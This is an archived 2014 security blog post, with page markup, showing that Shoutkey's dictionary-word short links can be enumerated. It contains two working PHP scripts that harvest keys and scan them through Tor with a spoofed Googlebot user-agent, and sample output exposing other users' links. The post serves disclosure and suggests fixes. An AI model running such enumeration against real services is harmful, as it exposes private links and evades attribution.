http://atxsec.com/shoutkey-is-insecure-by-design/
HTTP/1.1 200 OK
Server: cloudflare-nginx
Date: Sat, 26 Jul 2014 19:12:48 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: __cfduid=da866cdd39b9659705183dd0be09df0a21406401968229; expires=Mon, 23-Dec-2019 23:50:00 GMT; path=/; domain=.atxsec.com; HttpOnly
X-Powered-By: PHP/5.3.3
X-Pingback: http://atxsec.com/xmlrpc.php
Link: <http://atxsec.com/?p=54>; rel=shortlink
CF-RAY: 1502e92d65a502b6-IAD
Content-Encoding: gzip

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

	<title>Shoutkey.com is insecure by design :  atxsec</title>
	
<!--[if gte IE 7]><!-->
  <link rel="stylesheet" href="http://atxsec.com/wp-content/themes/manifest_v1.1/style.css" type="text/css" media="screen" charset="utf-8" />
<!-- <![endif]-->

<!--[if IE 7]>
  <link rel="stylesheet" href="http://atxsec.com/wp-content/themes/manifest_v1.1/style_ie.css" type="text/css" media="screen" charset="utf-8" />
<![endif]-->

<!--[if IE 6]>
<link rel="stylesheet" type="text/css" media="screen" href="http://atxsec.com/wp-content/themes/manifest_v1.1/styles_ie6.css" />
<![endif]-->

  <link rel="alternate" type="application/rss+xml" title="atxsec RSS Feed" href="http://atxsec.com/feed/" />
  <link rel="alternate" type="application/atom+xml" title="atxsec Atom Feed" href="http://atxsec.com/feed/atom/" />
  <script type="text/javascript" src="http://atxsec.com/wp-content/themes/manifest_v1.1/js/jquery-1.3.2.min.js" charset="utf-8">
    
  </script>
  <link rel="pingback" href="http://atxsec.com/xmlrpc.php" />
    
            <script type="text/javascript">//<![CDATA[
            // Google Analytics for WordPress by Yoast v4.3.5 | http://yoast.com/wordpress/google-analytics/
            var _gaq = _gaq || [];
            _gaq.push(['_setAccount', 'UA-48279285-1']);
				            _gaq.push(['_trackPageview']);
            (function () {
                var ga = document.createElement('script');
                ga.type = 'text/javascript';
                ga.async = true;
                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';

                var s = document.getElementsByTagName('script')[0];
                s.parentNode.insertBefore(ga, s);
            })();
            //]]></script>
			<link rel="alternate" type="application/rss+xml" title="atxsec &raquo; Shoutkey.com is insecure by design Comments Feed" href="http://atxsec.com/shoutkey-is-insecure-by-design/feed/" />
<script type='text/javascript' src='http://platform.twitter.com/widgets.js?ver=3.9.1'></script>
<script type='text/javascript' src='http://atxsec.com/wp-includes/js/jquery/jquery.js?ver=1.11.0'></script>
<script type='text/javascript' src='http://atxsec.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://atxsec.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://atxsec.com/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='Windows XP End of Life &#8212; the fear' href='http://atxsec.com/windows-xp-end-of-life-the-fear/' />
<link rel='next' title='The dangers of incremental hostnames' href='http://atxsec.com/the-dangers-of-incremental-hostnames/' />
<meta name="generator" content="WordPress 3.9.1" />
<link rel='canonical' href='http://atxsec.com/shoutkey-is-insecure-by-design/' />
<link rel='shortlink' href='http://atxsec.com/?p=54' />
<style type="text/css" id="syntaxhighlighteranchor"></style>
</head>

<body class="single single-post postid-54 single-format-standard">


<div id="siteWrapper">

  <h1 class="vcard author"><a href="http://atxsec.com/" title="Home" class="fn">atxsec</a></h1>

  <div id="mainNav">
    <ul>
           </ul>
  </div>
		<div id="header-image">
		<a href="http://atxsec.com/" title="Home"><img src="https://atxsec.files.wordpress.com/2014/02/cropped-lakeatx3.jpg" width="500" height="160" alt="" /></a>
	</div>
      
  <div id="siteDescription">
    1337 st. Austin Texas<br/>
<br/>
<script src="http://coinwidget.com/widget/coin.js"></script>
<script>
CoinWidgetCom.go({
	wallet_address: "14bFXmsMHz2gKt1xy7ezeefwcZZExDvgmg"
	, currency: "bitcoin"
	, counter: "count"
	, alignment: "bc"
	, qrcode: true
	, auto_show: false
	, lbl_button: "I can haz btc?"
	, lbl_address: "Send here:"
	, lbl_count: "donations"
	, lbl_amount: "BTC"
});
</script>
  </div>

<div id="coreContent">

	

      <div class="post single hentry">
        <div class="postContent">
          <h3 class="entry-title">Shoutkey.com is insecure by design</h3>
          <h4 class="vcard author">by <span class="fn">atxsec</span></h4>
          <div class="entry-content">
              <div style="height:33px; padding-top:2px; padding-bottom:2px; clear:both;" class="kon_tergos"><div style="float:left; width:100px; " class="kon_tergos_facebook_like"> 
				<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fatxsec.com%2Fshoutkey-is-insecure-by-design%2F&amp;layout=button_count&amp;show_faces=false&amp;width=100&amp;action=like&amp;colorscheme=light&amp;height=27" 
					scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:100px; height:27px;" allowTransparency="true"></iframe>
			</div><div style="float:left; width:110px; padding-left:10px;" class="kon_tergos_twitter"> 
				<a href="http://twitter.com/share" class="twitter-share-button" data-count="horizontal" 
					data-text="Shoutkey.com is insecure by design @dustyfresh" data-url="http://atxsec.com/shoutkey-is-insecure-by-design/">Tweet</a> 
			</div></div> 
   <p>There are a ton of short-url generating services out there like <a href="http://tinyurl.com/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://tinyurl.com']);" title="tinyurl" target="_blank">tinyurl</a> and even <a href="http://goo.gl/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://goo.gl']);" title="google url shortener" target="_blank">Google&#8217;s url shortening service</a>. One of my favorite of these services is a website called <a href="http://shoutkey.com/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://shoutkey.com']);" title="shoutkey" target="_blank">Shoutkey.com</a>. What is so special about <a href="http://shoutkey.com/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://shoutkey.com']);" title="shoutkey" target="_blank">Shoutkey</a>?</p>
<p>Well, <a href="http://shoutkey.com/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://shoutkey.com']);" title="shoutkey" target="_blank">Shoutkey</a> by design uses words that could be found within a standard English dictionary. Meaning when you create a short-link using the website the end result isn&#8217;t some randomly generated URL &#8212; it&#8217;s based on a dictionary word. On the record: I&#8217;m a huge fan of <a href="http://shoutkey.com/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://shoutkey.com']);" title="shoutkey" target="_blank">Shoutkey</a>. Let&#8217;s look at an example of these two types of services side by side and observe how their link structure vary.<br />
<em>a Tinyurl example</em><br />
<code>http://tinyurl.com/8kp</code><br />
<em>a shoutkey example</em><br />
<code>http://shoutkey.com/armchair</code><br />
One might use <a href="http://shoutkey.com/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://shoutkey.com']);" title="shoutkey" target="_blank">Shoutkey</a> as compared to <a href="http://tinyurl.com/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://tinyurl.com']);" title="TinyURL" target="_blank">Tinyurl</a> so they can share the word with the person instead of sending them the direct link; the short-url can be easily shared via speech. Now, this is obviously flawed as in theory someone could automate creating short links to build a dictionary from <a href="http://shoutkey.com/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://shoutkey.com']);" title="shoutkey" target="_blank">Shoutkey</a> so they could test it for valid links.</p>
<p>Nah, that&#8217;s too much time to dedicate and most likely wouldn&#8217;t even work&#8230;<strong>or would it?</strong><br />
<span id="more-54"></span><br />
<em>Also, in the case of ethics. The information obtained through this method is from publicly exposed data &#8212; just automated. I searched thoroughly on the website to see if I could find a sort of Terms of Service or Acceptable Use Policy; but there was nothing. Not only that, but the websites creator looks like a jolly fellow who might even enjoy a blog post such as this.</em></p>
<p>I suppose in order to spy on the created links within <a href="http://shoutkey.com/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://shoutkey.com']);" title="shoutkey" target="_blank">Shoutkey</a>, we would need to build a dictionary list of &#8216;keys&#8217; to test. Normally I would use a stock dictionary like the one that comes in most distro&#8217;s located in <a href="http://en.wikipedia.org/wiki/Words_%28Unix%29" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://en.wikipedia.org']);" title="unix words" target="_blank">/usr/share/dict/words</a>, but after some research it seems that list is huge and I would like to make sure I did not spend years testing. Therefore I wrote this script to create a short-url to google on <a href="http://shoutkey.com/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://shoutkey.com']);" title="shoutkey" target="_blank">Shoutkey</a>, and print the key that it was assigned. I ran it using a BASH one-liner with a sleeper enabled to prevent from flooding the server with <a href="http://en.wikipedia.org/wiki/POST_%28HTTP%29" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://en.wikipedia.org']);" title="POST request" target="_blank">POST requests</a>.</p>
<pre class="brush: php; title: ; notranslate" title="">
#!/usr/bin/php
&lt;?php
// educational and research uses only
require &quot;simple_html_dom.php&quot;;
$curl = curl_init();
$postdata = array(
                'url' =&gt; 'http://google.com/',
                'ttl' =&gt; 300, //5 minutes of life for our link
                'mysubmit' =&gt; 'Shout+it%21',
);
$opts = array(
                CURLOPT_PROXY =&gt; &quot;socks5://localhost:9050&quot;,
                CURLOPT_URL =&gt; &quot;http://shoutkey.com/new&quot;,
                CURLOPT_HEADER =&gt; true,
                CURLOPT_RETURNTRANSFER =&gt; true,
                CURLOPT_USERAGENT =&gt; &quot;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot;,
                CURLOPT_POSTFIELDS =&gt; $postdata,
        );
$postdata = http_build_query($postdata);
curl_setopt_array($curl,$opts);
$pagedata = curl_exec($curl);
$scrape = str_get_html($pagedata)-&gt;find('a',7)-&gt;plaintext;
print substr($scrape,20) . &quot;\n&quot;;
curl_close($curl);
?&gt;
</pre>
<p>Using the above code I was able to build a small dictionary of keys that the site uses. From here I wrote code that would check each key to see if it was valid. If the key was in use, it prints the key name and the URL the key was assigned.</p>
<pre class="brush: php; title: ; notranslate" title="">
#!/usr/bin/php
&lt;?php
// educational and research uses only
$keys = file(&quot;./keys.txt&quot;);
foreach($keys as $key){
$curl = curl_init();
$opts = array(
                CURLOPT_PROXY =&gt; &quot;socks5://localhost:9050&quot;,
                CURLOPT_URL =&gt; &quot;http://shoutkey.com/$key&quot;,
                CURLOPT_HEADER =&gt; true,
                CURLOPT_RETURNTRANSFER =&gt; true,
                CURLOPT_USERAGENT =&gt; &quot;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot;,
);
curl_setopt_array($curl,$opts);
curl_exec($curl);
$req = curl_getinfo($curl);
if($req['http_code'] == 302){
        print $req['url'] . &quot; =&gt; &quot; . $req['redirect_url'] . &quot;\n&quot;;
}
sleep(0.5);
curl_close($curl);
}
?&gt;
</pre>
<p>So in the above code you can see we&#8217;re curl&#8217;ing each key in our dictionary and checking the returned HTTP status code, also bouncing our request through TOR (and user-agent set to impersonate Google). If the code returned is a 302 (redirect) then we print data about the request including the key&#8217;s URL and the destination of the redirect (the URL the key is assigned to). It looks like my proof of concept worked! Using the dictionary of keys I built I was able to find a few links that started with the letter a (that was the only range I tested).<br />
<code><br />
dustin@atxsec shoutkey-poc $ ./testkeys.php<br />
http://shoutkey.com/abstain =&gt; http://stream79a-he.grooveshark.com/stream.php?streamKey=cd1bb93b7b094fd54682484f287bec1cb3c5fde5_53128e90_1d617d5_218fd43_1174852d1_1_0<br />
http://shoutkey.com/amalgamate =&gt; http://www.stg.nytimes.com/projects/oscars/2014/red-carpet/?slide=1<br />
http://shoutkey.com/anticipation =&gt; http://stream80d.grooveshark.com/stream.php?streamKey=510ccfed953b7443ed506d6720e5fa815b314e87_5312923a_1df24bc_2261ac5_11749410d_1_0<br />
</code><br />
This is the reason that most of the services offering short URL generation use randomly generated links. Although it completely defeats the purpose of <a href="http://shoutkey.com/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://shoutkey.com']);" title="shoutkey" target="_blank">Shoutkey</a>, there could be improvements to the system. For instance, each key can require a pin in order access the key&#8217;s link.</p>
<p><strong>Why is this bad?</strong></p>
<ul>
<li>Links generated should be only for the eyes of the sender and receiver, not a third party.</li>
<li>This method could be utilized to collect metadata about data submitted to <a href="http://shoutkey.com/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://shoutkey.com']);" title="shoutkey" target="_blank">Shoutkey</a>.</li>
<li>Some links passed through <a href="http://shoutkey.com/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://shoutkey.com']);" title="shoutkey" target="_blank">Shoutkey</a> may contain private information</li>
</ul>
<p><em>This further tells us to be weary of the services we use, and the secrets that we tell them.</em></p>
          </div>
        </div>
        <div class="postMeta">
                  
          <div class="postDate"><span>Published:</span> <abbr class="published" title="2014-03-02T02:34:34+0000"><a href="http://atxsec.com/2014/03/02/">March 2, 2014</a></abbr></div>
        	<div class="categories"><span>Filed Under:</span> <a href="http://atxsec.com/category/fail/" title="View all posts in fail" rel="category tag">fail</a>, <a href="http://atxsec.com/category/scripts/php/" title="View all posts in php" rel="category tag">php</a>, <a href="http://atxsec.com/category/random/" title="View all posts in random" rel="category tag">random</a>, <a href="http://atxsec.com/category/scripts/" title="View all posts in scripts" rel="category tag">scripts</a>, <a href="http://atxsec.com/category/security/" title="View all posts in security" rel="category tag">security</a></div>
        	        	
        	

        </div>
      </div>

            
	<!-- You can start editing here. -->
<div id="comments">
    	<h3 id="comments">One Response to &#8220;Shoutkey.com is insecure by design&#8221;</h3>

  	<div class="navigation">
  		<div class="alignleft"></div>
  		<div class="alignright"></div>
  	</div>

  	<ol class="commentlist">
  			<li class="pingback even thread-even depth-1" id="comment-33">
				<div id="div-comment-33" class="comment-body">
				<div class="comment-author vcard">
						<cite class="fn"><a href="http://www.lukehebert.com/2014/03/02/shoutkey-com-is-insecure-by-design/" onclick="javascript:_gaq.push(['_trackEvent','outbound-commentauthor','http://www.lukehebert.com']);"  rel='external nofollow' class='url'>Shoutkey.com is insecure by design | Luke Hebert</a></cite> <span class="says">says:</span>		</div>
		
		<div class="comment-meta commentmetadata"><a href="http://atxsec.com/shoutkey-is-insecure-by-design/#comment-33">
			March 16, 2014 at 1:30 am</a>		</div>

		<p>[&#8230;] Shoutkey.com is insecure by design [&#8230;]</p>

		<div class="reply">
			<a class='comment-reply-link' href='/shoutkey-is-insecure-by-design/?replytocom=33#respond' onclick='return addComment.moveForm("div-comment-33", "33", "respond", "54")'>Reply</a>		</div>
				</div>
		</li><!-- #comment-## -->
  	</ol>

  	<div class="navigation">
  		<div class="alignleft"></div>
  		<div class="alignright"></div>
  	</div>
   

  

  
<div id="respond">  
  

<form action="http://atxsec.com/wp-comments-post.php" method="post" id="commentform">

  <div class="leaveComment">
    
    <fieldset>
      <legend><span>Leave a Comment</span></legend>
      <div class="commentForm">
      
                        <div class="commentAuthorInfo">
            <label>Name: <em>Required</em> <input type="text" name="author" id="author" value="" /></label>
            <label>Email: <em>Required, not published</em> <input type="text" name="email" id="email" value="" /></label>
            <label>Homepage: <input type="text" name="url" id="url" value="" /></label>
          </div>
        <label>Comment:
        <textarea name="comment" id="comment" cols="50" rows="20"></textarea></label>
      
        <div id="cancel-comment-reply">
        	<small><a rel="nofollow" id="cancel-comment-reply-link" href="/shoutkey-is-insecure-by-design/#respond" style="display:none;">Cancel Reply</a></small>
        </div>
        <input type="submit" value="Post Comment" /> <input type="hidden" name="comment_post_ID" value="54" />
      </div>
    </fieldset>
  </div>
  <input type='hidden' name='comment_post_ID' value='54' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />

<p class="cptch_block"><br />		<input type="hidden" name="cptch_result" value="NBU=" />
		<input type="hidden" name="cptch_time" value="1406401967" />
		<input type="hidden" value="Version: 2.4" />
		n&#105;n&#101; &minus; 9 =  <input id="cptch_input" type="text" autocomplete="off" name="cptch_number" value="" maxlength="2" size="2" aria-required="true" required="required" style="margin-bottom:0;display:inline;font-size: 12px;width: 40px;" />	</p>
</form>
</div>


  </div>

  <div class="pageNav">
    <div class="prev"><a href="http://atxsec.com/windows-xp-end-of-life-the-fear/" rel="prev">&laquo; Previous Post</a></div>
    <div class="next"><a href="http://atxsec.com/the-dangers-of-incremental-hostnames/" rel="next">Next Post &raquo;</a></div>
  </div>


	
</div>


</div>

<div id="footer">

    <!-- <p>&copy; Powered by <a href="http://wordpress.org/">WordPress</a> and <a href="http://jimbarraud.com/manifest/">Manifest</a></p> !-->
  </div>

 <script type='text/javascript' src='http://atxsec.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js?ver=3.0.9'></script>
<script type='text/javascript' src='http://atxsec.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPhp.js?ver=3.0.9'></script>
<script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "http://atxsec.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
		var themecssurl = "http://atxsec.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeMidnight.css?ver=3.0.9";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['auto-links'] = false;
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();
</script>
<script type='text/javascript' src='http://atxsec.com/wp-includes/js/comment-reply.min.js?ver=3.9.1'></script>

</body>
</html>

